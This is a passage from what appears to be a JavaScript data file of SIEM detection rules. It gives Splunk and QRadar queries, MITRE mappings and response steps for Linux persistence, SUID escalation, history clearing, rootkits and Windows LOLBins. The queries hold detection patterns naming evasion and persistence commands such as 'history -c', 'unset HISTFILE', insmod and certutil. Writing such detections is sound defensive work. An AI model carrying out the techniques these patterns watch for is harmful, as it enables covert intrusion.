falsePositives:{desc:"Legitimate cron job management by system administrators, automated deployment tools (Ansible/Puppet), application-installed cron jobs",splunk:`| where NOT (user IN ("root","ansible","deploy") AND match(_raw,"(?i)(backup|cleanup|rotate)"))`,qradar:`AND NOT username IN ('ansible','deploy')`,allowlist:"Document approved cron management accounts and expected cron jobs."},
commonErrors:"User crontabs and system crontabs are in different locations. Some cron implementations don't log edits. The cron daemon log shows execution, not creation. auditd provides better visibility for crontab file changes.",
responseActions:"1) Review the cron entry content. 2) If downloading/executing remote scripts: malicious — remove immediately. 3) Check what the cron job has already executed. 4) Look for the entry vector (compromised account, web shell). 5) Verify all cron entries across the system."},

{id:"lx-3",cat:"linux-threats",title:"SSH authorized_keys Modification",mitre:{id:"T1098.004",name:"Account Manipulation: SSH Authorized Keys",tactic:"Persistence"},severity:"High",
desc:"Detects modifications to SSH authorized_keys files, used by attackers to add their public keys for persistent SSH backdoor access to Linux systems.",
splunk:`index=linux_secure sourcetype=linux_secure
| where match(_raw,"(?i)(authorized_keys|\\.ssh/authorized)")
| stats count by host, user, _time
| table _time, host, user, count`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as ssh_key_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND eventname ILIKE '%authorized_keys%'
GROUP BY sourceip, username, qid
ORDER BY ssh_key_events DESC LAST 24 HOURS`,
logs:["Linux auditd (file monitoring on ~/.ssh/)","FIM on authorized_keys files","SSH server logs","Syslog"],
bestPractice:"Monitor ~/.ssh/authorized_keys for ALL users. Any new key addition should be verified. Implement centralized SSH key management. Use certificate-based SSH authentication instead of key-based. Regular audit of authorized_keys across all systems.",
falsePositives:{desc:"Legitimate SSH key deployment via automation (Ansible), user self-service key management, initial system provisioning",splunk:`| where NOT (user IN ("ansible","deploy","provisioning"))`,qradar:`AND NOT username IN ('ansible','deploy')`,allowlist:"Document SSH key management processes. Alert on manual key additions."},
commonErrors:"auditd must be configured to monitor ~.ssh/authorized_keys. Some attackers add keys to system accounts (root, www-data). authorized_keys2 is an alternative file that's also valid.",
responseActions:"1) Identify the newly added public key. 2) Match the key to known authorized keys. 3) If unauthorized: remove the key immediately. 4) Investigate how the key was added. 5) Check for other persistence mechanisms. 6) Force key rotation."},

{id:"lx-4",cat:"linux-threats",title:"Privilege Escalation via SUID Binary",mitre:{id:"T1548.001",name:"Abuse Elevation Control: Setuid and Setgid",tactic:"Privilege Escalation"},severity:"High",
desc:"Detects creation of new SUID/SGID binaries or execution of known SUID exploitation targets, used for local privilege escalation on Linux systems.",
splunk:`index=linux_secure sourcetype=linux_secure
| where match(_raw,"(?i)(chmod.*[24][0-7][0-7][0-7]|chmod.*\\+s|setuid|setgid)")
| table _time, host, user, _raw`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as suid_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND (eventname ILIKE '%chmod%+s%' OR eventname ILIKE '%setuid%')
GROUP BY sourceip, username, qid
ORDER BY suid_events DESC LAST 24 HOURS`,
logs:["Linux auditd (chmod/chown syscalls)","FIM for SUID bit changes","Syslog","Process execution monitoring"],
bestPractice:"New SUID binaries should be extremely rare in production. Maintain an inventory of approved SUID binaries. Use auditd to monitor chmod syscalls that set SUID bit. GTFOBins documents known SUID exploitation techniques. Minimize SUID binaries via nosuid mount option.",
falsePositives:{desc:"Package installations/updates setting SUID on system binaries, automated hardening scripts adjusting permissions",splunk:`| where NOT (user="root" AND match(_raw,"(?i)(apt|yum|rpm|dpkg)"))`,qradar:`AND NOT username = 'root'`,allowlist:"Maintain approved SUID binary list. Alert on any new SUID binary creation."},
commonErrors:"SUID on shell/script interpreters is always dangerous. Some SUID exploits don't generate log events. Container environments may have different SUID requirements. auditd must capture the specific chmod syscalls.",
responseActions:"1) Identify the new SUID binary. 2) If not in approved list: investigate. 3) Remove SUID bit: chmod u-s /path/to/binary. 4) Check if the binary was already exploited. 5) Review how a non-root user set SUID (requires root already or misconfiguration)."},

{id:"lx-5",cat:"linux-threats",title:"History File Cleared",mitre:{id:"T1070.003",name:"Indicator Removal: Clear Command History",tactic:"Defense Evasion"},severity:"Medium",
desc:"Detects clearing of shell history files (.bash_history, .zsh_history), environment variable manipulation to disable history, or direct truncation of history files.",
splunk:`index=linux_secure sourcetype=linux_secure
| where match(_raw,"(?i)(history\\s+-c|unset\\s+HISTFILE|HISTSIZE=0|HISTFILESIZE=0|truncate.*history|>.*\\.bash_history|rm.*\\.bash_history|shred.*history)")
| table _time, host, user, _raw`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as history_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND (eventname ILIKE '%history -c%' OR eventname ILIKE '%HISTFILE%'
    OR eventname ILIKE '%bash_history%')
GROUP BY sourceip, username, qid
ORDER BY history_events DESC LAST 24 HOURS`,
logs:["Linux auditd","Process execution monitoring","File monitoring on history files","Syslog"],
bestPractice:"History clearing is suspicious on production servers. Configure HISTTIMEFORMAT for timestamped history. Set HISTFILE as readonly. Forward command history to remote syslog in real-time. Use auditd for definitive command logging that can't be cleared by users.",
falsePositives:{desc:"Users clearing history for privacy on shared terminals, automated cleanup scripts",splunk:`| where NOT (host IN ("shared-terminal") AND user IN ("cleanup"))`,qradar:`AND NOT username = 'cleanup'`,allowlist:"Production servers should never have history cleared. Document any exceptions."},
commonErrors:"History clearing commands are captured in history before it's cleared. Sophisticated attackers modify HISTCONTROL or use space-prefixed commands. auditd provides tamper-proof logging.",
responseActions:"1) Determine what the user is trying to hide. 2) Check auditd logs for commands executed before clearing. 3) If production server: investigate as potential compromise. 4) Review all recent activity by the user."},

{id:"lx-6",cat:"linux-threats",title:"Rootkit Indicators — Unusual Kernel Module",mitre:{id:"T1014",name:"Rootkit",tactic:"Defense Evasion"},severity:"Critical",
desc:"Detects potential rootkit installation by monitoring for loading of unusual kernel modules, modification of /etc/ld.so.preload, and other rootkit deployment indicators.",
splunk:`index=linux_secure sourcetype=linux_secure
| where match(_raw,"(?i)(insmod|modprobe|ld\\.so\\.preload|/lib/modules|rmmod.*force)")
  AND NOT match(_raw,"(?i)(nvidia|virtualbox|vmware|kvm|acpi|sound|usb|net)")
| table _time, host, user, _raw`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as rootkit_events
FROM events WHERE LOGSOURCENAME(logsourceid) ILIKE '%Linux%'
  AND (eventname ILIKE '%insmod%' OR eventname ILIKE '%modprobe%'
    OR eventname ILIKE '%ld.so.preload%')
GROUP BY sourceip, username, qid
ORDER BY rootkit_events DESC LAST 24 HOURS`,
logs:["Linux auditd (init_module syscall)","dmesg/kernel logs","File Integrity Monitoring on /lib/modules/","Syslog","EDR kernel module monitoring"],
bestPractice:"New kernel module loading should be rare in production. Monitor for insmod/modprobe of non-standard modules. LD_PRELOAD and /etc/ld.so.preload modifications enable userspace rootkits. Implement kernel module signing (UEFI Secure Boot). Use rkhunter/chkrootkit for periodic scanning.",
falsePositives:{desc:"Hardware driver installation, kernel updates loading new modules, virtualization tools installing their modules",splunk:`| where NOT match(_raw,"(?i)(nvidia|vbox|vmw|kvm|update|upgrade)")`,qradar:`AND NOT eventname ILIKE '%nvidia%'`,allowlist:"Document approved kernel modules. Alert on any new or unexpected module loading."},
commonErrors:"Kernel rootkits can hide themselves from lsmod and /proc. eBPF-based rootkits are harder to detect. Some rootkits modify existing modules rather than loading new ones. Memory forensics may be required for detection.",
responseActions:"1) CRITICAL — system integrity compromised. 2) Do NOT trust any tools running on the compromised system. 3) Boot from trusted media for investigation. 4) Perform memory forensics from external system. 5) Rebuild the system from known-good image. 6) Full IR."},

// ═══════════════════════════════════════
// CATEGORY 21: WINDOWS SPECIFIC
// ═══════════════════════════════════════
{id:"ws-1",cat:"windows-specific",title:"LOLBins Execution from Unusual Path",mitre:{id:"T1218",name:"System Binary Proxy Execution",tactic:"Defense Evasion"},severity:"High",
desc:"Detects Windows Living-off-the-Land Binaries (LOLBins) being executed from non-standard paths, indicating potential binary planting or sideloading attacks.",
splunk:`index=wineventlog sourcetype=WinEventLog:Sysmon EventCode=1
| where match(Image,"(?i)(certutil|bitsadmin|mshta|regsvr32|rundll32|wmic|cscript|wscript)\\.exe$")
  AND NOT match(Image,"(?i)(\\\\windows\\\\system32|\\\\windows\\\\syswow64)")
| table _time, ComputerName, User, Image, CommandLine, ParentImage`,
qradar:`SELECT sourceip, username, QIDNAME(qid) as event_name, COUNT(*) as lolbin_events
FROM events WHERE (eventname ILIKE '%certutil%' OR eventname ILIKE '%bitsadmin%'
  OR eventname ILIKE '%mshta%' OR eventname ILIKE '%regsvr32%')
  AND NOT eventname ILIKE '%system32%'
GROUP BY sourceip, username, qid ORDER BY lolbin_events DESC LAST 24 HOURS`,
logs:["Sysmon Event 1","Windows Security 4688","Application whitelisting logs","EDR process telemetry"],
bestPractice:"System utilities should ONLY run from System32 or SysWOW64. Any LOLBin running from another path is either copied (suspicious) or is malware masquerading. 100% confident detection for most LOLBins. Deploy AppLocker with path-based rules.",
falsePositives:{desc:"Almost none for path-based detection. Portable admin tools (very rare in production)",splunk:`| where NOT match(Image,"(?i)(\\\\windows\\\\winsxs)")`,qradar:`AND NOT eventname ILIKE '%winsxs%'`,allowlist:"Only System32 and SysWOW64 paths. WinSxS as secondary legitimate path."},
commonErrors:"WoW64 (SysWOW64) is a valid alternative path for 32-bit versions. The WinSxS folder may contain legitimate copies. Path comparison must be case-insensitive.",
